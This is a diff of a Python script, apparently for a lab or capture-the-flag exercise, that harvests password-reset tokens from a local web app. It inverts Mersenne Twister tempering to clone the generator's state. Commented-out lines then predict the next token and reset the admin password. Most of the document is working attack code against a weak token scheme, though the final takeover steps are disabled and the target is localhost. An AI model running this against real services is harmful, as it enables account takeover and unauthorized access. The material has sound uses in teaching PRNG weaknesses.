@@ -1,6 +1,6 @@
 import base64
 from urllib.parse import urljoin
-from bs4 import BeautifulSoup, Comment
+from bs4 import BeautifulSoup
 import requests
 #Mersenne Twister MT 19937
 class MT19937:
@@ -14,6 +14,7 @@ class MT19937:
 	F = 1812433253
 
 	def __init__(self, seed):
+		print(seed)
 		if isinstance(seed, bytes):
 			seed = int.from_bytes(seed, 'big')
 		#seed = seed & 0xFFFFFFFF
@@ -66,24 +67,27 @@ class MT19937:
 
 
 def reverse_right_xor(y, shift):
-    unaffected_mask = (1 << shift) - 1
-    while unaffected_mask < 0xFFFFFFFF:
-        y ^= (y >> shift) & unaffected_mask
-        unaffected_mask = (unaffected_mask << shift) | ((1 << shift) - 1)
+    i = 0
+    while i * shift < 32:
+        part_mask = ((1 << shift) - 1) << (shift * i)
+        part = y & part_mask
+        y ^= part >> shift
+        i += 1
     return y
+
 
 def reverse_left_xor_and(y, shift, and_mask):
-    unaffected_mask = (0xFFFFFFFF >> shift) << shift
-    while unaffected_mask:
-        y ^= (y << shift) & and_mask & unaffected_mask
-        unaffected_mask &= ~(and_mask << shift)
-        unaffected_mask >>= shift
+    for i in range(32 // shift):
+        part_mask = ((1 << shift) - 1) << (shift * i)
+        part = y & part_mask
+        y ^= (part << shift) & and_mask
     return y
 
-def unmix(y):
+# dont know if this is right
+def u_mix(y):
     y = reverse_right_xor(y, 18)
-    y = reverse_left_xor_and(y, 15, 0xefc60000)
-    y = reverse_left_xor_and(y, 7, 0x9d2c5680)
+    y = reverse_left_xor_and(y, 15, 0xEFC60000)
+    y = reverse_left_xor_and(y, 7, 0x9D2C5680)
     y = reverse_right_xor(y, 11)
     return y
 
@@ -92,12 +96,14 @@ def decode_and_reverse(token):
 	reversed_integers = []
 
 	try:
-		decoded_bytes = base64.b64decode(token)
-		# Assuming the expected byte length is a multiple of 4 for 32-bit integers  # Return the empty list if the condition is not met
-		
-		integers = [int.from_bytes(decoded_bytes[i:i+4], 'big') for i in range(0, len(decoded_bytes), 4)]
-		print()
-		reversed_integers = [unmix(integer) for integer in integers]
+		decoded = base64.b64decode(token.encode('utf-8'))
+		decoded_bytes = decoded.decode('utf-8')
+		values = decoded_bytes.split(":")
+		print(values)
+		for b in values:
+			reversed_int = u_mix(int(b))
+			reversed_integers.append(reversed_int)
+		print(reversed_integers)
 	except Exception as e:
 		print(f"Error processing token: {e}")
 
@@ -108,37 +114,28 @@ def decode_and_reverse(token):
 def extract_token_from_html(response):
 	soup = BeautifulSoup(response.text, 'html.parser')
 
-	# Find all <p> tags
 	p_tags = soup.find_all('p')
 	print(p_tags)
 	for p in p_tags:
-		# Assuming the token is directly the text of a <p> tag
-		# and that it contains some identifiable part of the token format,
-		# such as being a base64 string or having a specific prefix.
 		if "token" in p.text:
-			# Extract and return the token
-			return extract_only_token(p.text.strip())  # .strip() removes any leading/trailing whitespace
+			return get_token(p.text.strip())  
 
-	return None # Return None if no token was found
+	return None 
 
-def extract_only_token(token_string):
-    # First, find the start of the token parameter in the URL
+def get_token(token_string):
     token_start = token_string.find('token=') + len('token=')
-    # Then, find the end of the token, which might be the space or newline after the token
-    token_end = token_string.find(' ', token_start)  # Assuming a space terminates the token
-    if token_end == -1:  # If no space found, it might be terminated by a newline
+    token_end = token_string.find(' ', token_start)  
+    if token_end == -1:  
         token_end = token_string.find('\n', token_start)
-    if token_end == -1:  # If still not found, assume the token goes till the end of the string
+    if token_end == -1: 
         token_end = len(token_string)
-    # Extract the token using the indices found
+
     token = token_string[token_start:token_end].strip()
     return token
 
-
-
 def collect_tokens(base_url, forgot_password_endpoint, username):
 	tokens = []
-	for i in range(10):
+	for i in range(78):
 		full_url = urljoin(base_url, forgot_password_endpoint)
 		response = requests.post(full_url, data={'user': username})
 		if response.status_code == 200:
@@ -174,6 +171,32 @@ def register_user(base_url, username, password):
     else:
         print(f"Failed to register user {username}. Status Code: {response.status_code}")
 
+
+def generate_test_outputs(seed, count=10):
+    mt = MT19937(seed)
+    outputs = [mt.extract_number() for _ in range(count)]
+    return outputs
+
+def temper(y):
+    y ^= (y >> 11)
+    y ^= (y << 7) & 0x9D2C5680
+    y ^= (y << 15) & 0xEFC60000
+    y ^= (y >> 18)
+    return y
+
+def test_umix(seed=123, count=10):
+    original_outputs = generate_test_outputs(seed, count)
+    tempered_outputs = [temper(y) for y in original_outputs]
+    reversed_outputs = [u_mix(y) for y in tempered_outputs]
+
+    # Check if the reversed outputs match the original outputs
+    for original, reversed_y in zip(original_outputs, reversed_outputs):
+        assert original == reversed_y, f"Failed to reverse tempering: {original} != {reversed_y}"
+
+    print("All tests passed. u_mix is correctly reversing the tempering process.")
+
+
+
 if __name__ == "__main__":
 	# collecting the tokens
 	base_url = "http://0.0.0.0:8080"
@@ -189,20 +212,20 @@ if __name__ == "__main__":
 
 	decoded_and_reversed = []
 	for token in tokens:
-		# Decoding and reversing the token to get integers
 		integers_from_token = decode_and_reverse(token)
-		# Verify you get exactly 8 integers from each token
 		
 		decoded_and_reversed.extend(integers_from_token)
 	print(len(decoded_and_reversed))
-	# generate new instance of MT with initial state
-	# mt_clone = MT19937(0)  # Initialize with a dummy seed
+	# # generate new instance of MT with initial state
+	# mt_clone = MT19937(0)
 	# mt_clone.set_state(decoded_and_reversed)
 
 	# predicted_token = predict_next_token(mt_clone)
-
-	# #reset password
+	# print(predicted_token)
+	# # #reset password
 	# reset_endpoint = "reset"
 	# new_password = "imgoated"  # Choose a new password for the admin
-	# reset_admin_password(base_url, reset_endpoint, predicted_token, new_password)
+	# print(reset_admin_password(base_url, reset_endpoint, predicted_token, new_password))
+
+	test_umix(246, 10)
 
